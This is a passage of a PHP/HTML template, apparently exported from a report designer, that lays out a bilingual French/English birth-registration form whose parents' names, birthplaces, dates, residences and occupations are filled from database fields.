<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:60px"></td>
<td style="width:490px"></td>
<td style="width:1px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['CPOB']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:551px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
</tr>
<tr valign="top" style="height:24px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:60px"></td>
<td style="width:491px"></td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:21px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">De sexe</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:50px"></td>
<td style="width:501px"></td>
</tr>
<tr valign="top" style="height:24px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:50px"></td>
<td style="width:451px"></td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:21px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Sex</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:33px"></td>
<td style="width:468px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:468px"></td>
</tr>
<tr valign="top" style="height:13px">
<td>
</td>
</tr>
<tr valign="top" style="height:3px">
<td>
<svg height="3" width="468"><line x1="0" y1="0" x2="468" y2="3" style="fill:#FFFFFF;stroke:#000000;stroke-width:1.0;"/></svg></td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:11px"></td>
<td style="width:408px"></td>
<td style="width:49px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Male</span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="2">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="37">
</td>
</tr>
<tr valign="top" style="height:55px">
<td>
</td>
<td colspan="35">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:60px"></td>
<td style="width:498px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">De</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:21px"></td>
<td style="width:60px"></td>
<td style="width:478px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:41px"></td>
<td style="width:514px"></td>
<td style="width:4px"></td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:41px"></td>
<td style="width:417px"></td>
<td style="width:101px"></td>
</tr>
<tr valign="top" style="height:30px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['FName']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:559px"></td>
</tr>
<tr valign="top" style="height:15px">
<td>
</td>
</tr>
<tr valign="top" style="height:40px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:51px"></td>
<td style="width:507px"></td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Né à</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:36px"></td>
<td style="width:69px"></td>
<td style="width:454px"></td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Born at</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:52px"></td>
<td style="width:27px"></td>
<td style="width:476px"></td>
<td style="width:4px"></td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:1px">
<td rowspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Le</span></td>
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="3">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:34px"></td>
<td style="width:66px"></td>
<td style="width:403px"></td>
<td style="width:56px"></td>
</tr>
<tr valign="top" style="height:39px">
<td>
</td>
<td colspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:69px"></td>
<td style="width:400px"></td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- On the</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:56px"></td>
<td style="width:15px"></td>
<td style="width:373px"></td>
<td style="width:25px"></td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="2">
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['FPOB']; ?></span></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['FDOB']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td colspan="2" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:6px">
<td colspan="37">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="2">
</td>
<td colspan="10">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:80px"></td>
<td style="width:74px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Domicilié à</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:72px"></td>
<td style="width:82px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Resident at</span></td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="24">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:404px"></td>
</tr>
<tr valign="top" style="height:15px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:378px"></td>
<td style="width:25px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['FLocation']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:37px">
<td>
</td>
<td colspan="34">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:488px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Profession</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:557px"></td>
</tr>
<tr valign="top" style="height:37px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:68px"></td>
<td style="width:82px"></td>
<td style="width:4px"></td>
<td style="width:400px"></td>
<td style="width:3px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
<td rowspan="3" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Occupation</span></td>
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:2px">
<td>
</td>
<td colspan="3">
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:150px"></td>
<td style="width:378px"></td>
<td style="width:29px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['FOccupation']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:557px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:487px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Et de</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:40px"></td>
<td style="width:517px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:67px"></td>
<td style="width:450px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- And of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:51px"></td>
<td style="width:466px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:3px"></td>
<td style="width:463px"></td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:389px"></td>
<td style="width:77px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['MName']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="4">
</td>
<td colspan="30">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:482px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Née à</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:38px"></td>
<td style="width:514px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:67px"></td>
<td style="width:447px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Born at</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:51px"></td>
<td style="width:463px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:463px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:389px"></td>
<td style="width:74px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['MPOB']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:36px">
<td colspan="3">
</td>
<td colspan="31">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:70px"></td>
<td style="width:482px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Le</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:26px"></td>
<td style="width:67px"></td>
<td style="width:460px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- On the</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:67px"></td>
<td style="width:1px"></td>
<td style="width:485px"></td>
</tr>
<tr valign="top" style="height:16px">
<td colspan="2">
</td>
<td rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:6px"></td>
<td style="width:388px"></td>
<td style="width:91px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['MDOB']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:485px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:63px"></td>
<td style="width:422px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Resident </span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:11px"></td>
<td style="width:474px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:474px"></td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:49px"></td>
<td style="width:425px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:425px"></td>
</tr>
<tr valign="top" style="height:14px">
<td>
</td>
</tr>
<tr valign="top" style="height:2px">
<td>
<svg height="2" width="425"><line x1="0" y1="0" x2="425" y2="2" style="fill:#FFFFFF;stroke:#000000;stroke-width:1.0;"/></svg></td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:5px"></td>
<td style="width:399px"></td>
<td style="width:21px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['MLocation']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Domicilié à</span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="4">
</td>
<td colspan="29">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:61px"></td>
<td style="width:91px"></td>
<td style="width:396px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Occupation</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:67px"></td>
<td style="width:68px"></td>
<td style="width:413px"></td>
</tr>
<tr valign="top" style="height:20px">
